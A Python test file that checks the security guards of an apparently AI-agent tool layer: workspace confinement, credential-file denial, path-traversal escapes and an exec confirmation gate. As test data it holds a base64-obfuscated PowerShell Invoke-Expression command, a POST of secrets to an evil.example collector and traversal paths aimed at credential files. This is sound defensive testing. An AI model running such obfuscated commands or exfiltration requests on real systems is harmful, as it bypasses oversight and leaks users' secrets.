"""Area 13 (adversarial security) guard tests for the shared surface.

Every test here calls the REAL guard / decision function on command TEXT or on a
synthetic request object. Nothing dangerous is ever handed to something that
would execute it (safety rule 7), and no test performs network I/O.
"""
import os

import pytest

from rigma import tools


# --- 13-2: reads default to the workspace, credentials are denied -------------

@pytest.fixture
def home(tmp_path, monkeypatch):
    monkeypatch.setenv("RIGMA_HOME", str(tmp_path / "rigma-home"))
    return tmp_path


def test_absolute_reads_are_off_by_default(home):
    outside = home / "outside"
    outside.mkdir()
    (outside / "a.txt").write_text("hi", encoding="utf-8")
    ws = home / "ws"
    ws.mkdir()
    out = tools.run_tool("read_file", {"path": str(outside / "a.txt")},
                         {"workspace": str(ws)})
    assert out.startswith("error") and "absolute path" in out


def test_the_explicit_grant_restores_absolute_reads(home):
    outside = home / "outside"
    outside.mkdir()
    (outside / "a.txt").write_text("hi", encoding="utf-8")
    ws = home / "ws"
    ws.mkdir()
    out = tools.run_tool("read_file", {"path": str(outside / "a.txt")},
                         {"workspace": str(ws), "allow_absolute_reads": True})
    assert out.strip() == "hi"


@pytest.mark.parametrize("name", [".env", "id_rsa", "server.pem",
                                  "service.key", ".gemini_api_key",
                                  "credentials.json", ".netrc"])
def test_a_credential_file_is_refused_even_with_the_grant(home, name):
    d = home / "creds"
    d.mkdir()
    f = d / name
    f.write_text("SECRET", encoding="utf-8")
    out = tools.run_tool("read_file", {"path": str(f)},
                         {"workspace": str(home), "allow_absolute_reads": True})
    assert out.startswith("error") and "credential" in out.lower()


def test_a_credential_directory_is_refused(home):
    ssh = home / ".ssh"
    ssh.mkdir()
    (ssh / "known_hosts").write_text("x", encoding="utf-8")
    out = tools.run_tool("list_directory", {"path": str(ssh)},
                         {"workspace": str(home), "allow_absolute_reads": True})
    assert out.startswith("error")


def test_rigmas_own_state_directory_is_refused(home):
    from rigma.runtime import rigma_home
    sess = rigma_home() / "sessions"
    sess.mkdir(parents=True, exist_ok=True)
    (sess / "x.json").write_text("{}", encoding="utf-8")
    out = tools.run_tool("read_file", {"path": str(sess / "x.json")},
                         {"workspace": str(home), "allow_absolute_reads": True})
    assert out.startswith("error") and "state" in out.lower()


def test_a_workspace_inside_the_state_dir_is_not_off_limits(home):
    # a workspace that IS (or lives in) the state dir is an explicit choice;
    # the DEFAULT workspace is the home dir, which merely CONTAINS it, and that
    # case stays denied (see the test above).
    from rigma.runtime import rigma_home
    ws = rigma_home() / "work"
    ws.mkdir(parents=True, exist_ok=True)
    (ws / "notes.txt").write_text("ok", encoding="utf-8")
    out = tools.run_tool("read_file", {"path": "notes.txt"},
                         {"workspace": str(ws)})
    assert out.strip() == "ok"


def test_move_files_to_an_absolute_destination_is_still_a_write(home):
    # AUDIT 13-2 confined reads; a destination is a write and kept its old
    # behaviour — no reads grant needed.
    #
    # R3-TOOL-4 changed what "old behaviour" may be: an absolute destination is
    # now its own explicit grant, because needing only the default-on
    # `allow_code` made this tool LESS confined than `write_file`, which has
    # always been pinned to the workspace. Both halves are asserted, so the
    # grant cannot quietly become a no-op.
    ws = home / "ws"
    ws.mkdir()
    (ws / "a.txt").write_text("x", encoding="utf-8")
    dest = home / "sorted"
    base = {"workspace": str(ws), "allow_code": True}
    out = tools.run_tool("move_files",
                         {"paths": [str(ws / "a.txt")], "dest": str(dest)},
                         base)
    assert out.startswith("error"), out
    assert "outside the workspace" in out
    assert not dest.exists()          # nothing was created

    # the reads grant is NOT the writes grant — the two are separate risks
    out = tools.run_tool("move_files",
                         {"paths": [str(ws / "a.txt")], "dest": str(dest)},
                         {**base, "allow_absolute_reads": True})
    assert out.startswith("error"), out

    # with the explicit write grant it works
    out = tools.run_tool("move_files",
                         {"paths": [str(ws / "a.txt")], "dest": str(dest)},
                         {**base, "allow_absolute_writes": True})
    assert out.startswith("moved 1 file(s)"), out
    assert (dest / "a.txt").is_file()

    # OD-2: an allowlisted root is the SECOND route — it needs no blanket
    # grant, and it is what lets the owner keep writing to the folders they
    # already work in while `allow_absolute_writes` stays off.
    allowed = home / "allowed"
    allowed.mkdir()
    (ws / "b.txt").write_text("y", encoding="utf-8")
    out = tools.run_tool("move_files",
                         {"paths": [str(ws / "b.txt")], "dest": str(allowed)},
                         {**base, "write_allowlist": [str(allowed)]})
    assert out.startswith("moved 1 file(s)"), out
    assert (allowed / "b.txt").is_file()


def test_move_files_gates_the_source_parent_as_a_write(home):
    """ODR-3: a move REMOVES its source, so the source's directory is a write.

    Only `allow_absolute_reads` gated it, so a read-only session could delete
    `Documents\\thesis.docx` by moving it. The parent now passes the same
    workspace/grant/allowlist check as a destination; `copy_files` (which only
    reads the source) is unchanged.
    """
    ws = home / "ws"
    ws.mkdir()
    docs = home / "Documents"
    docs.mkdir()
    (docs / "thesis.docx").write_text("x", encoding="utf-8")
    base = {"workspace": str(ws), "allow_code": True,
            "allow_absolute_reads": True}

    # the read grant is NOT a write grant — the move is refused and the
    # original stays exactly where it was
    out = tools.run_tool("move_files",
                         {"paths": [str(docs / "thesis.docx")],
                          "dest": "sorted"}, base)
    assert out.startswith("error"), out
    assert "outside the workspace" in out and str(docs) in out
    assert (docs / "thesis.docx").is_file()
    assert not (ws / "sorted").exists()

    # copy_files only READS the source, so the same call still works
    out = tools.run_tool("copy_files",
                         {"paths": [str(docs / "thesis.docx")],
                          "dest": "sorted"}, base)
    assert out.startswith("copied 1"), out
    assert (docs / "thesis.docx").is_file()

    # a source parent INSIDE the workspace needs no grant at all
    (ws / "inside.txt").write_text("y", encoding="utf-8")
    out = tools.run_tool("move_files",
                         {"paths": [str(ws / "inside.txt")], "dest": "sorted"},
                         base)
    assert out.startswith("moved 1 file(s)"), out
    assert (ws / "sorted" / "inside.txt").is_file()

    # and a WRITE-ALLOWLISTED source parent is the second route, exactly as it
    # is for a destination — no blanket write grant needed
    out = tools.run_tool("move_files",
                         {"paths": [str(docs / "thesis.docx")],
                          "dest": "sorted"},
                         {**base, "write_allowlist": [str(docs)]})
    assert out.startswith("moved 1 file(s)"), out
    assert not (docs / "thesis.docx").exists()


def test_an_obfuscated_path_into_the_state_dir_is_refused(home):
    """ODR-6: `_resolve_image` ran the denylist on the UNRESOLVED path.

    `x\\..\\rigma-home\\...` spells no denied directory, yet the OS opens the
    file inside it. The workspace here CONTAINS the state dir (the product's
    default workspace is the home dir), so the read grant is not involved —
    only the denylist can refuse it, and it must see the resolved path.
    """
    from rigma.runtime import rigma_home
    secret = rigma_home() / "secret"
    secret.mkdir(parents=True, exist_ok=True)
    (secret / "x.png").write_bytes(b"\x89PNG\r\n\x1a\n" + b"\x00" * 64)
    obfuscated = home / "x" / ".." / "rigma-home" / "secret" / "x.png"
    out = tools.run_tool("view_image", {"path": str(obfuscated)},
                         {"workspace": str(home), "has_vision": True})
    assert out.startswith("error"), out
    assert "state" in out.lower(), out
    assert tools.IMAGE_SENTINEL not in out


def test_a_destination_outside_every_allowlisted_root_is_refused(home):
    """OD-2: the allowlist is a boundary, not a second blanket grant — a
    destination that is in NO root still gets the existing refusal and creates
    nothing."""
    ws = home / "ws"
    ws.mkdir()
    (ws / "a.txt").write_text("x", encoding="utf-8")
    root = home / "drop"
    root.mkdir()
    dest = home / "elsewhere"
    out = tools.run_tool("copy_files",
                         {"paths": [str(ws / "a.txt")], "dest": str(dest)},
                         {"workspace": str(ws), "allow_code": True,
                          "write_allowlist": [str(root)]})
    assert out.startswith("error"), out
    assert "outside the workspace" in out
    assert not dest.exists()          # nothing was created


def test_confined_refuses_an_allowlisted_root_through_both_routes(home):
    """OD-2: `confined` is absolute-destination-free by policy, so neither the
    allowlist NOR the blanket grant may reach it."""
    ws = home / "ws"
    ws.mkdir()
    (ws / "a.txt").write_text("x", encoding="utf-8")
    root = home / "drop"
    root.mkdir()
    base = {"workspace": str(ws), "allow_code": True, "profile": "confined",
            "write_allowlist": [str(root)]}
    out = tools.run_tool("copy_files",
                         {"paths": [str(ws / "a.txt")], "dest": str(root)},
                         base)
    assert out.startswith("error"), out
    assert not (root / "a.txt").exists()

    out = tools.run_tool("copy_files",
                         {"paths": [str(ws / "a.txt")], "dest": str(root)},
                         {**base, "allow_absolute_writes": True})
    assert out.startswith("error"), out
    assert not (root / "a.txt").exists()


def test_an_allowlisted_root_does_not_admit_a_sibling_sharing_its_prefix(home):
    """A string-prefix test would let `C:\\ws2` through a `C:\\ws` root; the
    containment is `is_relative_to`, so it must not."""
    ws = home / "ws"
    ws.mkdir()
    (ws / "a.txt").write_text("x", encoding="utf-8")
    sibling = home / "ws2"          # shares the string prefix "ws"
    out = tools.run_tool("copy_files",
                         {"paths": [str(ws / "a.txt")], "dest": str(sibling)},
                         {"workspace": str(ws), "allow_code": True,
                          "write_allowlist": [str(home / "ws")]})
    assert out.startswith("error"), out
    assert "outside the workspace" in out
    assert not sibling.exists()


def test_an_allowlisted_root_does_not_admit_a_dotdot_traversal(home):
    """`<root>/../escaped` RESOLVES out of the root, and resolution is what is
    tested — a literal `startswith` on the raw string would admit it."""
    ws = home / "ws"
    ws.mkdir()
    (ws / "a.txt").write_text("x", encoding="utf-8")
    root = home / "drop"
    root.mkdir()
    out = tools.run_tool("copy_files",
                         {"paths": [str(ws / "a.txt")],
                          "dest": str(root / ".." / "escaped")},
                         {"workspace": str(ws), "allow_code": True,
                          "write_allowlist": [str(root)]})
    assert out.startswith("error"), out
    assert "outside the workspace" in out
    assert not (home / "escaped").exists()


def test_a_relative_destination_that_resolves_outside_is_refused(home):
    """The workspace-relative route must not be a way around the allowlist."""
    ws = home / "ws"
    ws.mkdir()
    (ws / "a.txt").write_text("x", encoding="utf-8")
    root = home / "drop"
    root.mkdir()
    out = tools.run_tool("copy_files",
                         {"paths": [str(ws / "a.txt")], "dest": "../escaped"},
                         {"workspace": str(ws), "allow_code": True,
                          "write_allowlist": [str(root)]})
    assert out.startswith("error"), out
    assert "outside the workspace" in out
    assert not (home / "escaped").exists()


@pytest.mark.skipif(
    os.name != "nt",
    reason="case-insensitive path containment is a Windows property")
def test_a_case_difference_is_treated_as_inside_on_windows(home):
    """Windows is case-insensitive, so a different-case spelling of a root is
    the SAME folder and must be admitted rather than refused."""
    ws = home / "ws"
    ws.mkdir()
    (ws / "a.txt").write_text("x", encoding="utf-8")
    root = home / "DropBox"
    root.mkdir()
    dest = str(root).upper()        # a different case spelling of the SAME dir
    out = tools.run_tool("copy_files",
                         {"paths": [str(ws / "a.txt")], "dest": dest},
                         {"workspace": str(ws), "allow_code": True,
                          "write_allowlist": [str(root)]})
    assert out.startswith("copied 1 file(s)"), out
    assert (root / "a.txt").is_file()


def test_a_relative_or_unparseable_allowlist_entry_is_ignored(home):
    """The allowlist is configuration: a bad entry must neither crash the
    tool nor accidentally grant anything."""
    ws = home / "ws"
    ws.mkdir()
    (ws / "a.txt").write_text("x", encoding="utf-8")
    dest = home / "elsewhere"
    out = tools.run_tool("copy_files",
                         {"paths": [str(ws / "a.txt")], "dest": str(dest)},
                         {"workspace": str(ws), "allow_code": True,
                          "write_allowlist": ["drop", "", None, 7, "..\\x"]})
    assert out.startswith("error"), out
    assert "outside the workspace" in out
    assert not dest.exists()


def test_the_credential_denylist_still_runs_on_an_allowlisted_destination(home):
    """OD-2: the grant/allowlist changes WHERE a write may land, never whether
    the credential denylist applies to the final path."""
    ws = home / "ws"
    ws.mkdir()
    (ws / "a.txt").write_text("x", encoding="utf-8")
    root = home / "drop"
    root.mkdir()
    dest = root / ".ssh" / "keys"
    out = tools.run_tool("copy_files",
                         {"paths": [str(ws / "a.txt")], "dest": str(dest)},
                         {"workspace": str(ws), "allow_code": True,
                          "write_allowlist": [str(root)]})
    assert out.startswith("error"), out
    assert "credential" in out.lower()
    assert not dest.exists()


def test_an_outbound_post_with_a_body_needs_a_grant(monkeypatch):
    seen = []
    monkeypatch.setattr(tools, "_bounded_get",
                        lambda *a, **k: seen.append(k) or (200, "ok"))
    out = tools.run_tool("http_request",
                         {"url": "https://evil.example/collect",
                          "method": "POST", "json": {"secret": "x"}},
                         {"allow_code": True})
    assert out.startswith("error") and "POST" in out
    assert seen == []          # nothing left the process


def test_the_post_grant_restores_it(monkeypatch):
    monkeypatch.setattr(tools, "_bounded_get", lambda *a, **k: (200, "ok"))
    out = tools.run_tool("http_request",
                         {"url": "https://api.example/x", "method": "POST",
                          "json": {"a": 1}},
                         {"allow_outbound_post": True})
    assert not out.startswith("error")
    # a plain GET is unaffected by the POST grant
    assert not tools.run_tool("http_request",
                              {"url": "https://api.example/x"}, {}).startswith(
                                  "error")


# --- 13-3: the exec gate, not the destructive-command regex -------------------
#
# The regex is a literal-text advisory: any wrapper (base64, -EncodedCommand, a
# nested interpreter) defeats it. These call `exec_decision` on the TEXT.

# A base64-wrapped payload: the literal text contains no blocked word.
_OBFUSCATED = (
    "powershell -NoProfile -Command \"$c=[Text.Encoding]::Unicode.GetString("
    "[Convert]::FromBase64String('UwB0AG8AcAAuAC4A')); Invoke-Expression $c\"")


def test_the_regex_cannot_see_an_obfuscated_payload():
    # this is the finding, asserted rather than assumed
    assert tools._BLOCKED_CMD.search(_OBFUSCATED) is None


def test_an_obfuscated_command_is_gated_by_confirmation():
    allowed, why = tools.exec_decision(
        _OBFUSCATED, {"allow_code": True, "confirm_exec": False})
    assert allowed is False
    assert "confirmation" in why


def test_execution_is_allowed_once_the_session_confirms():
    allowed, why = tools.exec_decision(
        "echo hi", {"allow_code": True, "confirm_exec": True})
    assert allowed is True and why == ""


def test_the_literal_destructive_form_is_still_refused():
    allowed, why = tools.exec_decision(
        "Stop-Computer -Force", {"allow_code": True, "confirm_exec": True})
    assert allowed is False and "blocked" in why


def test_deletion_is_refused_under_the_no_delete_profile():
    allowed, why = tools.exec_decision(
        "del a.txt", {"allow_code": True, "profile": "no-delete",
                      "confirm_exec": True})
    assert allowed is False and "deletion" in why


def test_confined_refuses_execution():
    allowed, why = tools.exec_decision(
        "echo hi", {"allow_code": True, "profile": "confined",
                    "confirm_exec": True})
    assert allowed is False and "confined" in why


def test_python_is_gated_the_same_way():
    allowed, why = tools.exec_decision(
        "print(1)", {"allow_code": True, "confirm_exec": False},
        python_src="print(1)")
    assert allowed is False and "confirmation" in why


def test_run_shell_does_not_spawn_when_confirmation_is_off(monkeypatch):
    """The wiring, not just the decision: the handler must not reach
    `_run_subprocess` at all. The launcher is stubbed so nothing can run."""
    called = []

    def _boom(*a, **k):
        called.append(a)
        return "ran"

    monkeypatch.setattr(tools, "_run_subprocess", _boom)
    out = tools.run_tool("run_shell", {"command": "echo hi"},
                         {"allow_code": True, "confirm_exec": False})
    assert out.startswith("error") and "confirmation" in out
    assert called == []


# --- the grants apply to BOTH path spellings ---------------------------------
#
# MEASURED 2026-10-05, live chat 493d17779613 (workspace C:\Users\amren, both
# grants ON). The tool trace was: read_file("C:\BGMI\Code.txt") OK, then
# write_file("C:\BGMI\ESP\offsets.h") refused with "pass a path RELATIVE to the
# workspace", then write_file("..\..\BGMI\ESP\offsets.h") refused with "path is
# outside the workspace — stay within it", then three read_file calls with
# `..\..` refused the same way. The grants were consulted ONLY on the absolute
# branch, so obeying the first refusal led straight into the second, which named
# no way forward — the owner had granted both capabilities and neither worked
# for the spelling the tools demanded.


def _ws_and_outside(home):
    ws = home / "ws"
    ws.mkdir(exist_ok=True)
    outside = home / "outside"
    outside.mkdir(exist_ok=True)
    return ws, outside


def test_a_relative_escape_obeys_the_read_grant(home):
    ws, outside = _ws_and_outside(home)
    (outside / "a.txt").write_text("hi", encoding="utf-8")

    refused = tools.run_tool("read_file", {"path": "../outside/a.txt"},
                             {"workspace": str(ws)})
    assert refused.startswith("error"), refused
    assert "allow reads outside the workspace" in refused, refused

    got = tools.run_tool("read_file", {"path": "../outside/a.txt"},
                         {"workspace": str(ws), "allow_absolute_reads": True})
    assert got.strip() == "hi", got


def test_a_relative_escape_obeys_the_write_grant(home):
    ws, outside = _ws_and_outside(home)
    ctx = {"workspace": str(ws), "allow_code": True}

    refused = tools.run_tool("write_file",
                             {"path": "../outside/new.txt", "content": "x"}, ctx)
    assert refused.startswith("error"), refused
    assert "write outside the workspace" in refused, refused
    assert not (outside / "new.txt").exists()      # refused means nothing made

    ok = tools.run_tool("write_file",
                        {"path": "../outside/new.txt", "content": "x"},
                        {**ctx, "allow_absolute_writes": True})
    assert not ok.startswith("error"), ok
    assert (outside / "new.txt").read_text(encoding="utf-8") == "x"


def test_the_write_grant_does_not_make_write_tools_take_absolute_paths(home):
    """The prompt's rule stands: `write_file`/`edit_file` are workspace-RELATIVE
    by contract. The grant changes WHERE a relative path may land, not the form
    the tool accepts — `test_file_tools_guidance` pins the other half."""
    ws, outside = _ws_and_outside(home)
    out = tools.run_tool("write_file",
                         {"path": str(outside / "abs.txt"), "content": "x"},
                         {"workspace": str(ws), "allow_code": True,
                          "allow_absolute_writes": True})
    assert out.startswith("error") and "absolute path" in out, out
    assert not (outside / "abs.txt").exists()


def test_the_allowlist_reaches_a_relative_escape_without_the_blanket_grant(home):
    """OD-2's second route applies to the relative spelling too, or the owner
    who configured the folders they work in still could not write to them."""
    ws, _ = _ws_and_outside(home)
    allowed = home / "allowed"
    allowed.mkdir(exist_ok=True)
    out = tools.run_tool("write_file",
                         {"path": "../allowed/kept.txt", "content": "y"},
                         {"workspace": str(ws), "allow_code": True,
                          "write_allowlist": [str(allowed)]})
    assert not out.startswith("error"), out
    assert (allowed / "kept.txt").read_text(encoding="utf-8") == "y"


def test_move_files_honours_the_grant_on_a_relative_destination(home):
    r"""R3-TOOL-4 gated the absolute destination and left `..\..` reaching the
    same places ungated — the grant has to answer for both."""
    ws, outside = _ws_and_outside(home)
    (ws / "a.txt").write_text("x", encoding="utf-8")
    base = {"workspace": str(ws), "allow_code": True}
    out = tools.run_tool("move_files",
                         {"paths": [str(ws / "a.txt")], "dest": "../outside"},
                         base)
    assert out.startswith("error"), out
    assert "write outside the workspace" in out, out
    out = tools.run_tool("move_files",
                         {"paths": [str(ws / "a.txt")], "dest": "../outside"},
                         {**base, "allow_absolute_writes": True})
    assert out.startswith("moved 1 file(s)"), out
    assert (outside / "a.txt").is_file()


def test_a_granted_escape_still_refuses_a_credential_file(home):
    """The grant widens WHERE a write may land, never WHAT may be overwritten."""
    ws, _ = _ws_and_outside(home)
    creds = home / "creds"
    creds.mkdir(exist_ok=True)
    (creds / "id_rsa").write_text("PRIVATE", encoding="utf-8")
    out = tools.run_tool("write_file",
                         {"path": "../creds/id_rsa", "content": "stolen"},
                         {"workspace": str(ws), "allow_code": True,
                          "allow_absolute_writes": True})
    assert out.startswith("error"), out
    assert (creds / "id_rsa").read_text(encoding="utf-8") == "PRIVATE"


def test_a_confined_profile_refuses_a_relative_escape_even_with_the_grants(home):
    ws, outside = _ws_and_outside(home)
    (outside / "a.txt").write_text("hi", encoding="utf-8")
    ctx = {"workspace": str(ws), "profile": "confined",
           "allow_absolute_reads": True, "allow_absolute_writes": True}
    read = tools.run_tool("read_file", {"path": "../outside/a.txt"}, ctx)
    assert read.startswith("error"), read
    write = tools.run_tool("write_file",
                           {"path": "../outside/z.txt", "content": "x"}, ctx)
    assert write.startswith("error"), write
    assert not (outside / "z.txt").exists()
